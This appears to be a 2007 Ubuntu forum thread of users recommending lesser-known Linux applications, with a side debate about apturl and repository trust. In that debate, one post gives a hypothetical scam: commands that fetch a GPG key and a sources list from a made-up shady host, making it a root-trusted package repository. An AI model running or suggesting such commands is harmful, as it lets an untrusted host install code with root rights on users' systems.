### Post by Ingo88 on 2007-10-23
While messing around with the gnome panel I came up with a great idea: to make a search in Synaptic for "gnome panel". I found two nice apps:

**cpufire-applet** - A beautiful fire burning on your panel. The higher your cpu usage, the bigger the flame grows.
**hardware-monitor** - This is the one I stuck with, though. You can monitor your network usage, cpu usage, memory & swap usage, etc on your panel. Finally something that replaces Samurize! Have tried conky, karamba and others, but I liked none of those.

---

### Post by tyggna1 on 2007-10-23
I don't know how well known these are--but I haven't seen it mentioned and I've read over half the posts.

Azureus -- bit-torrent client that is java based.  I like it because it has a GUI for the swarm,  let's you prioritize individual files to download, and will also create torrents for you to host--is compatible with a wide variety of bit-torrent clients (believe it's only in the medibuntu repo, though)

Amule - a peer-to-peer program.  I like it.

Apart from that
+1 to tremulous, and for my not-in-repo list:

zsnes -- dfreer has it in his repository.  Best super-Nintendo emulator out there
psx -- again, not in the repos, but it can handle ps2 games with the right bios dump.
mupen64 -- okay, but needs more development to be a really good nintendo 64 emulator

---

### Post by DJ_Peng on 2007-10-23
> **Ingo88 said:**
> **hardware-monitor** - This is the one I stuck with, though. You can monitor your network usage, cpu usage, memory & swap usage, etc on your panel. Finally something that replaces Samurize! Have tried conky, karamba and others, but I liked none of those.
This is already available. Right click the panel, select Add To Panel..., and look for System Monitor under System & Hardware. I use this all the time, especially since I can left click it and open the System Monitor itself. It's available by default in Ubuntu Feisty and Gutsy.

---

### Post by fuscia on 2007-10-27
> **quixotic-cynic said:**
> Heh, it's Openbox for me. I opened Fluxbox the first time and... "WTH?!?!? Nothing works?!?!?". I didn't know any of the key shortcuts so I was stuck. I've got Openbox working nice now... look! no panels! :)

ha, i've had that experience with both of them. i thought openbox didn't work because all i got was an instant black screen. the first time i used fluxbox (in breezy), it installed with a menu, but now, you get nothing. all you have to do is log out and log back in and you'll have a menu. you can then edit .fluxbox/menu. it's pretty simple to edit *[exec] (app'sstupidname) {app'scommand}*.

### Post by Onyros on 2007-10-27
> **fuscia said:**
> well, you could just copy the menu from /etc/X11 (i think is where it's at) to .fluxbox. one you get past it, it's a much easier menu to edit than openbox.



leafpad, maybe?I was going to suggest Leafpad as well, it's only lacking on one thing he needs: spell-checking.

Other than that, I also use Beaver, a little GTK1 editor which has grown on me ever since I first tried it on Damn Small Linux.

### Post by Harpoon on 2007-11-02
md5deep -- in the repositories.

Everyone knows about md5 to verify downloads/copies, but using it is a royal pia if you are moving large directories/many files.  This utility can work recursively on whole directories.  I use it to make sure that those multi-gigayte copies to a new hard disk result in good copies.It can use md5, sha, tth .. and will tell you what files do not match. It takes a while, to be sure, but I now feel a whole lot better when I get to the point of actually **deleting** the source file directory.

It really isn't "cool" so maybe it belongs in a "thank god I have this" thread.

THIS thread has turned out to be one of the great ones, though.  Thanks

### Post by michaelzap on 2007-11-04
> **TeaSwigger said:**
> They've all worked for me... what features are you looking for then?

Well let's see... I guess the minimum requirements for me would be:

[LIST]
[*]SFTP/FXP
[*]multi-threading
[*]synchronized folders
[*]a decent site/session manager
[*]automatic ascii/binary detection
[*]auto-resume (and append to) transfers
[*]multiple tabs/workspaces (preferably with drag & drop among them)
[*]ability to set file permissions/owner/etc.
[*]no java or wine
[/LIST]

Other people might want desktop integration, scheduling, scripting, and/or compression, but that list would probably do it for me.

Right now I use FireFTP because it does most of what I want, but I'd really prefer a stand-alone app (WS_FTP for Linux!).

---

### Post by 3rdalbum on 2007-11-05
Everyone knows about Google Earth, but did you know that the latest version has a flight simulator in it?

Press Control-Alt-A, and you can choose your aeroplane and airport. The usual flight-sim controls will control your plane, and as you fly over new terrain Google Earth will stream more image information. There's a plugin for Flightgear which does a similar thing, but this is pretty cool!

### Post by cozmic charlie on 2007-11-06
Great thread - 

Azsmrc ([http://azsmrc.sourceforge.net/](http://azsmrc.sourceforge.net/)) - A great bittorrent client/server app:

 I use bittorrent a lot for downloading music and I prefer Azereus for various reasons.  A number of people have listed other bittorrent clients that are excellent.  One of the main reasons I use Azereus is an application called Azsmrc (available on sourceforge).  This is a great little client/server app for both Linux and Windows.  Azsmrc allows you to set up Azereus on your server with the Azsmrc plug-in.  Then you can set up the Azsmrc client on all your other computers (Linux and Windows and I believe even Mac).  You can then download any torrent from any computer using Azsmrc to your server (Linux or Windows).  A very handy app, very lightweightand, and the developers are very active creating new plug-ins that expand the usability.  Good alternative for bittorrent over a network.

### Post by maestrobwh1 on 2007-11-07
**Brasero** - burns DVD iso files at higher speeds than K3B
**Ex Falso** - tags all kinds of music formats including aac (m4a)
**Soundkonverter** - converts most formats assuming you have codecs and have configured the program to use them
**Simple backup** (sbackup) - backs up whatever directories you want, excludes directories as well
**GtkOrphan**- removes orphaned files, frees disk space
**Localepurge** - purges language files for things you don't speak or anticipate speaking.  Saved me 33 meg.
**Kdirstat**- lists used space in directories
**Kshutdown** - timer for having system shut down... useful for downloading but you don't want your machine running the WHOLE night when you go to bed
**gmount-iso** (gisomount?) helps mount iso files without needing to go to the terminal
Krusader-maybe this is kind of common, but it is my favorite file manager.  Very powerful and intuitive.

---

### Post by urukrama on 2007-11-08
> **maestrobwh1 said:**
> **GtkOrphan**- removes orphaned files, frees disk space

You could just install deborphan and create a new filter in Synaptics:

Settings > Filters > New and uncheck all boxes except 'Orphaned'. You'll now have a new category in the Custom tab that does the same as gtkorphan. 

**Debfoster** is very handy too to find out what packages keep other packages installed and remove them easily if desired. From the man page:

> debfoster maintains a list of installed packages that were explicitly
     requested rather than installed as a dependency.  Arguments are entirely
     optional, debfoster can be invoked per se after each run of dpkg and/or
     apt-get.

 If a new package is encountered or if debfoster notices that a package
     that used to be a dependency is now an orphan, it will ask you what to do
     with it.  If you decide to keep it, debfoster will just take note and
     continue.  If you decide that this package is not interesting enough it
     will be removed as soon as debfoster is done asking questions.  If your
     choices cause other packages to become orphaned more questions will
     ensue.



---

### Post by urukrama on 2007-11-09
> **maestrobwh1 said:**
> 
**Simple backup** (sbackup) - backs up whatever directories you want, excludes directories as well

Be careful with this one if you don't have much disk space left. I wanted to try it out, and without me being aware of it, sbackup started to backup my files in /var/backups/ . It took up all the free space I had left (about 2 GBs), which prevented me from loging in after my next reboot.

### Post by urukrama on 2007-11-09
> **Bruce M. said:**
> Installed it but can't find it.  Can you give me a hint?
Not hard to tell I'm new   :)

You have to run it in a terminal. Type```
sudo debfoster
```

and answer whether you want to keep or remove the packages. From the man page (man debfoster):

> Whenever debfoster asks you about a package, any of the following
     responses can be given:

       &#8216;y&#8217;         Yes, keep the package. This is the default response.
       &#8216;n&#8217;         No, delete the package.
       &#8216;p&#8217;         Prune the package. This tells debfoster to also delete all
                   packages that are only installed because this package
                   depends on them.  A list of such packages, if any, is shown
                   above the prompt.
       &#8216;s&#8217;         Skip this question. The next time you run debfoster it will
                   ask you again about this package.
       &#8216;h&#8217;         Print a help message.
       &#8216;i&#8217; or &#8216;?&#8217;  Show information about the package.
       &#8216;u&#8217;         Undo last response.
       &#8216;q&#8217;         Exit without removing packages.  All changes will be lost.
       &#8216;x&#8217;         Save changes to debfoster database, remove unwanted pack&#8208;
                   ages, and exit without asking further questions.


Hope this helps.

### Post by urukrama on 2007-11-13
I've been using with [apwal]("http://apwal.free.fr/index.html") again, a simple, light and handy application launcher. It launches a wall with application icons (set up in whatever way you want) that appears around your mousecursor. It is great for people who want to keep their panels uncluttered, but stil have the advantage of application launchers. It has the added advantage that it doesn't consume any resources until you need it and it is launched (unlike a panel), and loads very fast.

I use it in Openbox and bind it to Alt+F3 (in Openbox's rc.xml file). I have attached a screenshot of my configuration of it. The middle icon (Thunar) is where my mousecursor is.

It is in the repos, but seems fairly unknown.

---

### Post by podunk on 2007-11-13
Way cool thread!

3ddesk - a spinning desktop switcher. Some of the functionality of compiz for older vid cards - works particularly well with old ATI cards.

kooldock - a popup dock application - ditto remark older video cards. Much easier to configure than kxdocker

Krusader. File manager along the lines of old Norton Commander - but seriously steroidal. Includes fully graphical sftp browser/agent. Nuff said!

Konqueror! How I used computers for 25 years without this I'll never understand. It slices, it dices, it plays media, it browses files, it syncs folders.

Also spell checks.:lolflag:

All the above are KDE apps - but if you have Amrock you have the needed libs. Konqueror *may* need kde-core - but that doesn't take much room.

All in the repositories of course.

katapult - a quick and dirty launcher for KDE apps. You can also add your files that you open often and non KDE stuff to the catalog.

the <alt> <space> keys then the first few letters of what you want to open, hit enter.

---

### Post by urukrama on 2007-11-14
**apt-file**

This application just saved me a lot of time. I was compiling something from source and had a missing dependency that I could not find anywhere. I installed it and typed:

> sudo apt-file update
sudo apt-file search *name of the missing dependency as given in the error message*

It tells you what packages include that file, so that you can install it and continue building from source. More [here]("http://debaday.debian.net/2007/01/24/apt-file-search-for-files-in-packages-installed-or-not/").

---

### Post by ukripper on 2007-11-14
> **urukrama said:**
> **apt-file**

This application just saved me a lot of time. I was compiling something from source and had a missing dependency that I could not find anywhere. I installed it and typed:



It tells you what packages include that file, so that you can install it and continue building from source. More [here]("http://debaday.debian.net/2007/01/24/apt-file-search-for-files-in-packages-installed-or-not/").

I second that!

### Post by Mud.Knee.Havoc on 2007-11-16
I don't know if these have been mentioned, but even if they have, everybody should know about them:

1. screen
2. rtorrent

Both are command-line programs (don't run away!) that are incredibly useful.  Screen lets you run a number of different terminal windows in one, even letting you use a split-screen to display two terminals in one window.  If you use a lot of different command line programs or terminal windows, you need screen!

Rtorrent is my favorite torrent program.  It's by far the easiest once you take a minute or two to customize the config file.  Basically, the config file lets you choose what kind of encryption you want and if you want it to watch a directory for .torrents!  Once you have this set, you just download your .torrent and it automatically starts downloading the file in the torrent client.  Quick and easy. :)  And it takes FAR less resources than any other client I've ever seen.

---

### Post by sunexplodes on 2007-11-21
It's because everybody assumes you're using Ubuntu Gutsy, which comes with the "Ubufox" extension package that, among other things, lets firefox deal with those apt links.

But for those suckers like us who use 7.04, or god forbid *Kubuntu*, we're **** out of luck, and we just get a lovely browser error.

### Post by Scruffynerf on 2007-11-21
> **Frak said:**
> Thanks for the **FUD**. The apt protocol only installs from the trusted repositories.

Not necessarily. There's a lot of people here that have modified repo source lists for particular applications. The stable version of a given software item might be in the official repo's, and a more recent and unstable version may exist in another repo. Blindly clicking a link in a browser, you don't get the option to select from which source the software comes from. 

Whilst it's true that malware isn't likely to come from this, malformed packages from bleeding edge repo's are.

Also a question regarding this functionality - where do you type your sudo pass - in a terminal or in Firefox? If it's the latter, that's a problem.

---

### Post by Vadi on 2007-11-21
In the gksudo dialog that comes up, so it's not a problem :)

---

### Post by Frak on 2007-11-21
> **Scruffynerf said:**
> Not necessarily. There's a lot of people here that have modified repo source lists for particular applications. The stable version of a given software item might be in the official repo's, and a more recent and unstable version may exist in another repo. Blindly clicking a link in a browser, you don't get the option to select from which source the software comes from. 

Whilst it's true that malware isn't likely to come from this, malformed packages from bleeding edge repo's are.

Also a question regarding this functionality - where do you type your sudo pass - in a terminal or in Firefox? If it's the latter, that's a problem.
It is fully contained within Synaptic.

Also, to add a separate repository comes with some knowledge of how to do so in the first place. When I say "It only installs from trusted repositories", I mean **It only installs from trusted repositories**. If the GPG key isn't available, then it will give many warnings about the chance of malware entering the system. Thus, the user is expected to have read the warnings and make a decision from that moment.
For the GPG key, it is possible to find that key and have a universal (yet temporary) blacklist on all software coming from that key. Note that it is possible for the keyservers to track key changes.

The Ubuntu Project contains some very intelligent developers, that I doubt would leave anything to chance.

---

### Post by Scruffynerf on 2007-11-21
> **Frak said:**
> It is fully contained within Synaptic.

Also, to add a separate repository comes with some knowledge of how to do so in the first place. When I say "It only installs from trusted repositories", I mean **It only installs from trusted repositories**. If the GPG key isn't available, then it will give many warnings about the chance of malware entering the system. Thus, the user is expected to have read the warnings and make a decision from that moment.
For the GPG key, it is possible to find that key and have a universal (yet temporary) blacklist on all software coming from that key. Note that it is possible for the keyservers to track key changes.

The Ubuntu Project contains some very intelligent developers, that I doubt would leave anything to chance.

Ah, that makes it quite a bit better than what it seemed. It's good to know that it'll avoid untrusted repo's. Mind you, there's enough guides out there for people to add the Medibuntu repo with GPG key, so it's not unreasonable that there are new users that already have this enabled.

Also, I'm not knocking the dev's, however linux isn't immune from iffy code. Have you read about the recent exploit discovered in the core library that FLAC depends on? The vulnerability affects all OS/s - Windows, OSX and linux. Mandriva's already shipping the updated code - see Secunia: ([http://secunia.com/advisories/27601/]("http://secunia.com/advisories/27601/"), however I've not yet seen anything come through the official or otherwise ubuntu repositories for Feisty - so there's a decent feisty install base that's susceptible to exploits.

Edit: [http://secunia.com/advisories/27628/](http://secunia.com/advisories/27628/) - Update's been posted for Ubuntu 7.04, in addition to other versions as well. That said, as of the time of this writing, nothing has come through the update manager.

### Post by houstonbofh on 2007-11-22
> **Frak said:**
> It is fully contained within Synaptic.

Also, to add a separate repository comes with some knowledge of how to do so in the first place. When I say "It only installs from trusted repositories", I mean **It only installs from trusted repositories**. If the GPG key isn't available, then it will give many warnings about the chance of malware entering the system. Thus, the user is expected to have read the warnings and make a decision from that moment.
For the GPG key, it is possible to find that key and have a universal (yet temporary) blacklist on all software coming from that key. Note that it is possible for the keyservers to track key changes.

The Ubuntu Project contains some very intelligent developers, that I doubt would leave anything to chance.
Let me give a quick example of how false this is.  I post that to fix all your problems and end all your worries, run this code in a terminal.
```
wget -q http://myshadywebsite.dnsalias.net/landscape.gpg -O- | sudo apt-key add -
sudo wget myshadywebsite.dnsalias.net/feisty.list -O /etc/apt/sources.list.d/scam.list

sudo apt-get update
```
You now have my trojan website in your repos as a "trusted" site.  Yes it takes a bit more interaction from the user, but how many people actually trped 'sudo rm -rf' in a term?  And if you follow this lead, we will soon have a URI for term:myshadywebsite.dnsalias.net/trojanscript.sh and that is some real scary stuff!

But we are so far off topic now I forgot what it was... :)

### Post by wildkarde on 2007-11-22
> **Frak said:**
> They are creating a plugin for konqueror and opera. There is a workaround ATM, I just can't seem to find it.

Found it in [here]("http://linuxappfinder.com/blog/single_click_installs#comment-368").  


> apturl can be made to work with the Opera web browser by going to Tools -> Preferences -> Advanced -> Programs and clicking "Add". Enter "apt" in the protocol field and enter "apturl" in the "Open with other application" field.

Repeat one more time with apt+http as the protocol.

### Post by Blutack on 2007-11-22
Freemat - Perfect for basic matlab when you can't be fussed waiting for a few hundred meg of nasty gui'd java to load and you are sick of Octave crashing.  Again.  Drop in compatible.  And WHAT-DA-YA know!  Its in the repos!  This is new! (Runs off to remove the dirty checkinstall built on Dapper).
[http://freemat.sourceforge.net/wiki/index.php/Main_Page](http://freemat.sourceforge.net/wiki/index.php/Main_Page)

QtiPlot - Found this one in the repo's by accident whilst looking for something like autograph.  Kinda hard to describe but basically will plot any functions or tables of data, nice GUI (qt4 but no KDE deps).
[http://soft.proindependent.com/qtiplot.html](http://soft.proindependent.com/qtiplot.html)

PyBackPack - in the repo's, nice little program to back up locally or over networks (uses gnome-vfs).  Uses rdiff-backup as backend.  Personally I just rdiff-backup from the command line, fantastic app although probably wellknown anyway.
[http://projects.sucs.org/projects/pybackpack/](http://projects.sucs.org/projects/pybackpack/)

Winedoors - not in the repos but gui installs all the popular stuff in wine for you - IE6, Half-Life 2 etc and installs all the stuff to 'set up' a decent wine drive (MS fonts etc).  Deb on the site.
[http://www.wine-doors.org/wordpress/](http://www.wine-doors.org/wordpress/)

Elisa media centre - this is a beauty.  Bit rough around the edges (not visually but the file scanner takes ages with no progress indication) ATM but one to watch.  In the repo.
[http://elisa.fluendo.com/](http://elisa.fluendo.com/)

Sound Converter - in the repo's.
Drag files, drop files, hit convert, get nice mp3/oggs/whatever out.  Perfect for those of us with mongrel music collections (which you could only get away with on linux anyway..."What the hell is this album ripped in?" "I don't know.  I don't have to.  Gstreamer does.")

Bluetooth File Sharing - in the repos as something like gnome-bluetooth or bluez gnome
Tiny app that sits in the sys tray and recieves obex transfers from the phone.  Does the job and does it very well.

Multisync - in repo.  Still my darling after all this time.  Syncs evolution calendar/contacts/tasks and my phone over bluetooth both ways with a single click.

wxMaxima - in repo. Checking tutorial answers has never been easier.  Will solve any equation you throw at it, along with int/diff, complex numbers and more.  Rock stable, can export latex too.

Cheese! - use your built-in webcam to take stupid photo's and videos of stuff/you.  Simple and *just-works* with my hp laptop when X-sane and everything else won't even try.  No package for gutsy but feisty works fine from getdeb.net
[http://www.getdeb.net/app.php?name=Cheese](http://www.getdeb.net/app.php?name=Cheese)

Last-Exit (with save song patch) - sure, it's naughty, but for saving those hard to find Hoff songs it's invaluable.  Bit unstable occasionally though, search the ubuntuforums for a deb.

Autofsck - this little script is a lifesaver for anyone who has been sat embarrassed waiting for a 22 mount ext3 check.  Pops up and warns you at logout a disc check is due and then does in during shutdown.  Or you can delay the check.  Deb at:
[https://wiki.ubuntu.com/AutoFsck](https://wiki.ubuntu.com/AutoFsck)

Airstrike - totally great game.  Like Biggles for the 21st century.  In the repos.

Wormux - worms for linux.  Repos.

Xmoto - kickass motorbike balance thing.  Repos.

mt-daapd - a previous poster mentioned tangerine.  This is better in my opinion (no dirty mono and you don't need a gui), it's now called firefly, web-based config and in the repo's.

Ok, that should fill enough page space.  (EDIT:  Wow, a whole page.  Sorry!)

+1 for screen and probs a load of other stuff.  Keyjnote FTW!  Be warned - the gutsy version won't actually work, you need to apply a patch but it is really really simple so don't worry.
[https://bugs.launchpad.net/ubuntu/+source/keyjnote/+bug/148070](https://bugs.launchpad.net/ubuntu/+source/keyjnote/+bug/148070)

---

### Post by PartisanEntity on 2007-11-23
Alexandria (in the repos)

> a GNOME application for managing book collections
Alexandria is a program for organising collections of books. It

  * retrieves and displays book information (including cover pictures) from
    several online libraries, such as Amazon, Proxis and Barnes and Noble
  * allows books to be added and updated by hand
  * enables searches either by EAN/ISBN, title, authors or keyword
  * can import and export data into ONIX, Tellico and ISBN-list formats
  * features a HIG-compliant user interface
  * handles book rating and notes
  * supports CueCat (R) barcode readers

Website: [http://alexandria.rubyforge.org/](http://alexandria.rubyforge.org/)

### Post by Scruffynerf on 2007-12-08
Found a few interesting file / directory explorers recently in the repos.

baobab - Disk Usage Analyser. It's the standard one.

filelight - Another one with different view and drill down options.

gdmap - An excellent visual version, supports tree and square cushioning, uses java, so heavier cpu requirements. Options to  color-code file types for easier file differentiation.

jdiskreport - similar to filelight, may be less resource intensive.

tdfsb - hilarious explorer via the command line. Make it almost game-like.

tree - displays the directory tree in the terminal, in color

viewglob - an odd one that has interactivity between the terminal and a graphical viewer.

### Post by IYY on 2007-12-09
**[SAGE](http://modular.math.washington.edu/sage/)** is an advanced mathematics program similar to Mathematica, but uses only GNU tools. For the home user, it's overkill and too difficult to use, but for people who need to do some real calculations, it's very robust.

In comparison to Mathematica, it is a bit more difficult to use, but for most purposes is faster, has more features and is more programmable (Python scripts can be written, and the code of the actual calculation algorithms can be tweaked).

Some of the simplest things it can do is solve equations and matrices, simplify algebra, differentiate and integrate, etc.

The program can run in the commandline as well as in the browser (it sets up its own web server automatically), where it gets an interface similar to that of Mathematica.

There is a precompiled Ubuntu executable, as well as a source-code version that takes a long time to compile but has no dependencies.

### Post by fuscia on 2007-12-19
**dmenu**. from the man page - "dmenu is a generic menu for X, originally designed  for  dwm(1). It  manages huge amounts (up to 10.000 and more) of user defined menu items efficiently."

i just started using dwm and the thing that has hooked me is dmenu. alt+p calls it to the toolbar. you can either scroll through the apps, or start typing the app's name. once hilighted, hit enter and it opens.

### Post by ckth on 2007-12-24
This is an amazing thread!

I spent hours poring over pages 1-47 before jumping here, exhausted.
Some applications missed above were, I think-

_(FROM THE REPOSITORIES)_

**cplay** : Terminal music player. Acts as a frontend for mpg123, plays mp3 and Ogg files. Very nifty app with intuitive keybindings. 
The [purveyor of heavenly lightweight applications]("http://kmandla.wordpress.com/about/") has a guide [here]("http://kmandla.wordpress.com/2007/05/01/howto-use-cplay-like-a-pro/").  

**alien** : A useful application to convert RPMs to DEBs, among other things. Had to use it several times while exploring games listed on this thread. (DEBs weren't available on the game websites, and was too lazy to compile from source.)

**quadkonsole** : Konsole mod that gives four (by default) konsoles sharing screen estate with keybindings to navigate. Useful for console multiplexing, although GNU Screen is arguably a better idea. 

**yeahconsole** : drop down console like Yakuake and Tilda (mentioned earlier); GTK based. 

**festival** : LISP based (I think) CLI software for reading text aloud. Has several other features I've not yet explored.

**GNU Octave** : Matlab-like CLI based computation software that integrates well (and automatically) with GNUPlot. It's not very popular, so I love peeving out my professors at college by adding a "Made with GNU-Octave" line in project reports and assignments. 

**finch** : Was referred to as Gaim-Text earlier. Ncurses based Terminal frontend for Gaim/Pidgin. Compared to other terminal messaging clients, it has the added advantage of being just a frontend, requiring no configuring if you use Pidgin.

**mcabber** : Terminal Jabber client. I can't get it to run from behind a http proxy, though.

**aria** : Download manager, like d4x. Looks old, but highly configurable, and very stable. Gives me higher speeds than wget or d4x.

**aria2** : Terminal based version of aria. 

**oggenc** : Simple CLI application for converting music files to Ogg format. The anti-Lame, if you will. 

_(NOT IN THE REPOSITORIES)_

[**startupmanager**]("http://web.telia.com/~u88005282/sum/index.html"): Multipurpose graphical manager for startup settings, written in Python. Changes the bootsplash screen, boot options (like timeout, items in the GRUB menu and defaults, resolution, etc). Also sets a GRUB password, 
It also changes Usplash settings, I think. 

**Gargoyle **: All-in-one application for playing Interactive Fiction. Runs every format ever created. Binaries available [here]("http://ccxvii.net/gargoyle/").

[**Gnome-Inform 7**]("http://www.inform-fiction.org/I7/Download.html"): Well documented software for writing Interactive Fiction. Makes it very easy for newbies to try their hand at writing IF. 

LINKS:

1.[Linux apps]("http://www.google.com/reader/shared/user/09012348886881806254/label/linuxapps"): List compiled primarily from lifehacker.com.

2. [www.linuxappfinder.com](www.linuxappfinder.com)
Site for finding alternatives to common Windows/Mac applications.

---

### Post by Mithrilhall on 2007-12-26
Well...that was a hefty thread to go through in one sitting. That being done here are a few suggestions:

**_[dsniff]("http://monkey.org/~dugsong/dsniff/")**_ - dsniff is a collection of tools for network auditing and penetration testing.
**_[Fail2ban]("http://www.fail2ban.org/wiki/index.php/Main_Page")**_ - Fail2ban scans log files like /var/log/pwdfail or /var/log/apache/error_log and bans IP that makes too many password failures. It updates firewall rules to reject the IP address. 
**_[Yakuake]("http://yakuake.uv.ro/")**_ - Yakuake is a Quake-style terminal emulator based on KDE Konsole technology.
**_[Hellanzb]("http://www.hellanzb.com/trac/")**_ - is a Python application designed for *nix environments that retrieves nzb files and fully processes them. The goal being to make getting files from Usenet  as hands-free as possible.
**_[Kbackup]("http://kbackup.sourceforge.net/")**_ - KBackup is a backup program for UNIX machines (kind of reminds me of Backup Exec)

---

### Post by tonytraductor on 2007-12-26
first, Omega T [http://www.omegat.org](http://www.omegat.org)
It is a CAT (computer aided translation) tool for translation memory.
I would like to see this included in the ubu repos.
I build a small livecd mini-distro and based it on PCFluxboxOS, only
because PCLOS includes this in their repos, and, making a livecd with
PCLOS was as easy as falling off a log.
I would have done this with Fluxbuntu, or possible Xubuntu, otherwise.
I use ubuntu on my main production box.

Another app I like is searchmonkey.
I discovered this on PCLOS.  It's a file search tool, but way faster
than the one that is bundled with KDE (my usual wm...or, at least until I
started playing with fluxbox, lately).
Searchmonkey is in our repos.


Oh, yeah, and one more really cool thing.
Speaking of window managers, if you want something light and simple
and very, very fast, try jwm (Joe's Window Manager).
You have to create your own menus and themes and stuff "by hand", almost nothing done automagically, but it is very fast, very simple, but still looks nice (unlike, say, ratpoison).
JWM is in our repos.

---

### Post by Mithrilhall on 2007-12-26
**_[iftop]("http://www.ex-parrot.com/pdw/iftop/")_** - iftop does for network usage what top(1) does for CPU usage. It listens to network traffic on a named interface and displays a table of current bandwidth usage by pairs of hosts. Handy for answering the question "why is our ADSL link so slow?" (For me, this is a must have tool).

### Post by tech9 on 2007-12-26
> **rsambuca said:**
> Hmmm...  Skype... Google Earth?  I haven't heard of those.  What do they do, anyways? ;)

**Skype** allows users to make telephone [calls]("http://en.wikipedia.org/wiki/VoIP") from their computer to other Skype users free of charge, or to [landlines]("http://en.wikipedia.org/wiki/Landlines") and [cell phones]("http://en.wikipedia.org/wiki/Cell_phones") for a fee. Additional features include [instant messaging]("http://en.wikipedia.org/wiki/Instant_messaging"), [file transfer]("http://en.wikipedia.org/wiki/File_transfer"), [short message service]("http://en.wikipedia.org/wiki/Short_message_service"), [video conferencing]("http://en.wikipedia.org/wiki/Video_conferencing") and its ability to circumvent [firewalls]("http://en.wikipedia.org/wiki/Firewall").

**Google Earth** is a [virtual globe]("http://en.wikipedia.org/wiki/Virtual_globe") program that was originally called Earth Viewer and was created by [Keyhole, Inc]("http://en.wikipedia.org/wiki/Keyhole%2C_Inc"). It maps the earth by the [superimposition]("http://en.wikipedia.org/wiki/Superimposition") of images obtained from [satellite imagery]("http://en.wikipedia.org/wiki/Satellite_imagery"), [aerial photography]("http://en.wikipedia.org/wiki/Aerial_photography") and [GIS]("http://en.wikipedia.org/wiki/Geographic_information_system") [3D]("http://en.wikipedia.org/wiki/Computer_graphics") globe.  :)

### Post by Midwest-Linux on 2007-12-27
MP3 Direct Cut
Martin Pesch
[http://mpesch3.de1.cc/mp3dc.html](http://mpesch3.de1.cc/mp3dc.html)

It  is the best MP3 splitter on the market money can buy...speaking of...it doesn't cost anything..its free to use...no spyware, no bloatware, just a small program...unfortunately it is a Windows based program.



Stereo Tool 2.10 
Audio Limiter/Compressor
[www.HansVanZutphen.com](www.HansVanZutphen.com)

This is probably the best audio compresser/limiter on the market for the money...yep this is also FREE..and its a Winamp plugin. If you have a small AM or FM broadcaster...this will make your station sound loud, yet sounding really good just like the big broadcasting stations. Even if you do not broadcast over the air...this will give your tunes a lot of punch. This is also a Windows program.


Juice
Podcatcher

This is available for Windows, Linux and Mac. It is the best podcatcher out there. Unfortunately, on some XP machines it will not run properly, other XP machines will run it. It will run flawlessly on Windows 2000. 


Zara Radio
Radio station Automation program
[http://www.zararadio.com/index.php?centro=main.php&lang=en](http://www.zararadio.com/index.php?centro=main.php&lang=en)

 Imagine being able to program your own radio station using professional like programming. Program music, news feeds, time and temperature announcements, cut away for live feeds and do this all automatically...and for free....this professional like program is excellent. It does take some getting used to and it is only Windows based...but its the best out there...and the price is right.

### Post by Praadur on 2007-12-27
Of those that are actually in the repos, there are only two that I can actually think of that might not be regularly used (as the point of the repos is to make things easy to find, after all).

**mtPaint** This is a pixel-art application, great for creating sprites, backgrounds and such for indy/retro games.

**KompoZer** This is simply my choice of HTML/CSS editor.  Whenever I'm feeling too lazy to create a real 'doc' or when I'm likewise not feeling up to writing the HTML of a page by hand, I'll usually just call up KompoZer and let that do it for me.

I'll mention a few 'off the record' too, if I can (but I won't link to them as that might be going against the spirit of the thread a little too much).

**KPlayer** The only player that ever worked really well for me (without hiccups, pauses, sound errors, and so on) was MPlayer, but MPlayer has a very rough GUI.  I tried SMPlayer, KMPlayer and a bunch of others but none of them really seemed to suit my tastes, they either weren't stable enough, or configurable enough... et cetera.  KPlayer (which also embeds MPlayer) was the only one that fit he bill, and I've used it since.

**sfxr** The perfect companion to mtPaint, as it's a system for easily creating retro sound effects, and by messing around with all of its various settings, it's quite amazing what can be done with it.  It's a handy little tool and saves one from having to do unspeakable things with a microphone.

**Swiftweasel** This is a speed-optimised (in compile) version of IceCat, the GNU (free art, no copyrights) version of Firefox.  I use it because they have an amd64 build of 3.0(beta 1 & 2), which has full page zoom and works beautifully with flash.

**qjoypad** This is basically an application (a graphical one at that) to map game controller functions (axis, d-pad, buttons, et cetera) to keys.  It's been no end of help with dealing with either my troublesome game controllers, or problematic applications that don't seem to like pads period (such as the Mega Drive emulator Gens).

### Post by Praadur on 2007-12-27
> **rolando2424 said:**
> Isn't the name IceWeasel?

IceWeasel is the name of the browser in the Debian repos as I recall, yes.  IceWeasel was also the name of the GNU fork (which uses free art and removes content which requires copyright), but to end confusion they've now renamed that to IceCat.

Swiftweasel on the other hand (all these bloody Firefox names do get confusing, for me at least) is a browser based off the GNU IceCat code, but they haven't changed their name yet to reflect the new one.  So whether their project will eventually become Swiftcat or somesuch, I know not.

The point of the Swiftweasel (Firefox) and Swiftdove (Thunderbird) projects are to provide versions of those pieces of software which are build-optimised to different processors.  As far as I'm aware, theirs is the only project too that has debs and a build for amd64 native (which means no more emulation!).

As you can likely guess, I have an amd64 chip and to be honest the 32-bit emulation just doesn't cut it for me most of the time (flash problems) and had I not found the Swiftweasel project I likely would've ended up compiling 64-bit versions of the IceCat codebase myself.  But they've saved me the trouble, bless 'em.

Anyway, since I've been asked about this, I will provide a link: [Swiftweasel & Swiftdove](http://swiftweasel.tuxfamily.org/).

I could also be completely wrong about everything that I've written there as I'm not the most knowledgeable person in the World, but I'm usually well-read so I *think* that's all right and proper.  If anyone sees a mistake there, please feel free to correct it!

---

### Post by finferflu on 2007-12-27
For young people like me, who started using email when Outlook was at its highest popularity, I have just found an ultra-cool CLI mail client. It's [Alpine](http://www.washington.edu/alpine/), an alternatively licensed Pine, a historic mail client as far as I can see. 

It's both simple and advanced. I like how the options are both for beginners and advanced users. I have used Mutt for some time, but I didn't like the configuration and using a chronjob to fetch mail. Alpine is solid and has everything built-in. 
The interface is clever and easy to use (you have an help at the bottom of the screen all the time). Give it a look, I loved it so much that I have left my dear GMail interface to use it. 
If you need any help with setting it up for GMail, just pm me.

---

### Post by Onyros on 2007-12-27
> **finferflu said:**
> For young people like me, who started using email when Outlook was at its highest popularity, I have just found an ultra-cool CLI mail client. It's [Alpine](http://www.washington.edu/alpine/), an alternatively licensed Pine, a historic mail client as far as I can see. 

It's both simple and advanced. I like how the options are both for beginners and advanced users. I have used Mutt for some time, but I didn't like the configuration and using a chronjob to fetch mail. Alpine is solid and has everything built-in. 
The interface is clever and easy to use (you have an help at the bottom of the screen all the time). Give it a look, I loved it so much that I have left my dear GMail interface to use it. 
